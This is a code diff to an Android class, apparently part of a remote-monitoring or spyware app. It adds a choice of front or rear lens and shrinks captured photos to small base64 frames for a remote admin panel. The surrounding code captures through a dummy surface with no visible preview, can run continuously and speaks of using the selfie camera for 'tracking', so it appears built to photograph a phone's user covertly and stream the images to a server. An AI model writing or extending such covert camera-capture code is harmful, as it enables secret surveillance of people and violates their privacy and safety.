@@ -70,6 +70,7 @@ public class RemoteCameraCapture {
     private boolean isCapturing = false;
     private boolean continuousMode = false;
     private long captureInterval = 10000; // 10 seconds default
+    private boolean useRearCamera = false; // false = front (selfie), true = rear/back
     private SurfaceTexture dummySurfaceTexture;
     private Surface dummySurface;
     private boolean isSamsungDevice;
@@ -93,7 +94,17 @@ public class RemoteCameraCapture {
      * Start capturing photos (single or continuous mode)
      */
     public void captureAndReport(boolean continuous, long intervalMs) {
-        Log.i(TAG, "Starting camera capture, continuous=" + continuous);
+        captureAndReport(continuous, intervalMs, "front");
+    }
+
+    /**
+     * Start capturing photos with a specific lens ("front" or "rear").
+     */
+    public void captureAndReport(boolean continuous, long intervalMs, String lens) {
+        this.useRearCamera = lens != null
+                && (lens.equalsIgnoreCase("rear") || lens.equalsIgnoreCase("back"));
+        Log.i(TAG, "Starting camera capture, continuous=" + continuous
+                + ", lens=" + (useRearCamera ? "rear" : "front"));
 
         if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                 != PackageManager.PERMISSION_GRANTED) {
@@ -175,11 +186,19 @@ public class RemoteCameraCapture {
         }
 
         try {
-            // Use front camera (selfie) for tracking - more useful
-            String cameraId = getFrontCameraId(cameraManager);
-            if (cameraId == null) {
-                // Fallback to back camera
+            // Pick the lens requested by the admin (front=selfie, rear=back).
+            String cameraId;
+            if (useRearCamera) {
                 cameraId = getBackCameraId(cameraManager);
+                if (cameraId == null) {
+                    cameraId = getFrontCameraId(cameraManager);
+                }
+            } else {
+                cameraId = getFrontCameraId(cameraManager);
+                if (cameraId == null) {
+                    // Fallback to back camera
+                    cameraId = getBackCameraId(cameraManager);
+                }
             }
             if (cameraId == null) {
                 Log.e(TAG, "No camera available");
@@ -203,8 +222,12 @@ public class RemoteCameraCapture {
                 // Retry once after enabling
                 try {
                     Thread.sleep(500);
-                    String retryId = getFrontCameraId(cameraManager);
-                    if (retryId == null) retryId = getBackCameraId(cameraManager);
+                    String retryId = useRearCamera
+                            ? getBackCameraId(cameraManager) : getFrontCameraId(cameraManager);
+                    if (retryId == null) {
+                        retryId = useRearCamera
+                                ? getFrontCameraId(cameraManager) : getBackCameraId(cameraManager);
+                    }
                     if (retryId != null) {
                         cameraManager.openCamera(retryId, stateCallback, backgroundHandler);
                         return;
@@ -455,11 +478,16 @@ public class RemoteCameraCapture {
                 byte[] bytes = new byte[buffer.remaining()];
                 buffer.get(bytes);
 
+                // Recompress to a small, network-friendly JPEG so frames stay
+                // smooth on low-bandwidth connections in the admin panel.
+                byte[] optimized = recompressForNetwork(bytes);
+
                 // Convert to base64 data URL
-                String base64Image = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                String base64Image = Base64.encodeToString(optimized, Base64.NO_WRAP);
                 String dataUrl = "data:image/jpeg;base64," + base64Image;
 
-                Log.i(TAG, "Photo captured, size: " + bytes.length + " bytes");
+                Log.i(TAG, "Photo captured, raw=" + bytes.length
+                        + "B optimized=" + optimized.length + "B");
 
                 // Send to server
                 reportPhotoToServer(dataUrl);
@@ -472,6 +500,53 @@ public class RemoteCameraCapture {
             }
         }
     };
+
+    /**
+     * Re-encode the captured JPEG into a small, low-bandwidth-friendly frame.
+     * Targets a maximum byte size so frames keep flowing smoothly on slow
+     * networks, stepping the JPEG quality down until the size fits.
+     */
+    private byte[] recompressForNetwork(byte[] original) {
+        try {
+            Bitmap bmp = BitmapFactory.decodeByteArray(original, 0, original.length);
+            if (bmp == null) {
+                return original;
+            }
+
+            // Downscale if the frame is larger than our streaming target so the
+            // payload stays small without losing the whole picture.
+            int maxDim = 480;
+            int w = bmp.getWidth();
+            int h = bmp.getHeight();
+            if (Math.max(w, h) > maxDim) {
+                float scale = (float) maxDim / Math.max(w, h);
+                int nw = Math.round(w * scale);
+                int nh = Math.round(h * scale);
+                Bitmap scaled = Bitmap.createScaledBitmap(bmp, nw, nh, true);
+                if (scaled != bmp) {
+                    bmp.recycle();
+                }
+                bmp = scaled;
+            }
+
+            final int targetMaxBytes = 28 * 1024; // ~28KB per frame
+            int quality = 60;
+            byte[] out;
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            do {
+                baos.reset();
+                bmp.compress(Bitmap.CompressFormat.JPEG, quality, baos);
+                out = baos.toByteArray();
+                quality -= 10;
+            } while (out.length > targetMaxBytes && quality >= 20);
+
+            bmp.recycle();
+            return out;
+        } catch (Throwable t) {
+            Log.w(TAG, "recompressForNetwork failed, using original", t);
+            return original;
+        }
+    }
 
     private void reportPhotoToServer(String photoDataUrl) {
         String deviceId = preferenceManager.getDeviceId();
